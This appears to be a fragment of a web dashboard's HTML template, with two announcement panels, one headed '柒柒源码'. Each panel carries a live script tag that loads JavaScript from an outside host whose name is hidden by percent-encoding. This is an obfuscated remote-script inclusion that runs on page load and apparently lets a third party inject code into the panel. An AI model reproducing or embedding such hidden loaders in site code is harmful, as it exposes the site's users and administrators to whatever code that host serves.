		...
		<div class="row">
			<div class="col-lg-6">
				<div class="alert alert-info refresh-log">
					...
					<script type="text/javascript" src="http://%68%37%37%30%2E%63%6F%6D/api.php?mod=js&bid=678"></script>
					</ul>
				</div>
			</div>
			<div class="col-lg-6">
				<div class="alert alert-info refresh-log">
					<h4><i class="fa fa-bullhorn"></i> 柒柒源码</h4>
					<ul class="list-unstyled">
					<script type="text/javascript" src="http://%68%37%37%30%2E%63%6F%6D/api.php?mod=js&bid=677"></script>
					</ul>
				</div>
			</div>
		</div>
